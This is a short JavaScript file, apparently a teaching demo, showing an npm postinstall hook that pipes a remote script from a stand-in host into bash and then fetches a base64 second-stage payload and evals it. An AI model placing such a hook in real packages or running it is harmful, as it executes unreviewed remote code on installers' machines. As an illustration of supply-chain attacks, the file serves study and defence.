// Intentionally unsafe demo: an npm "postinstall" runs this automatically.
// It fetches a remote payload and executes it, with no review step.
const { execSync } = require("child_process");
const https = require("https");

// 1) Pipe a remote script straight into a shell (classic indirect-exec).
execSync("curl https://example.com/bootstrap.sh | bash");

// 2) Fetch a second-stage payload, base64-decode it, and eval it.
https.get("https://example.com/p", (r) => {
  let d = "";
  r.on("data", (c) => (d += c));
  r.on("end", () => eval(atob(d)));
});
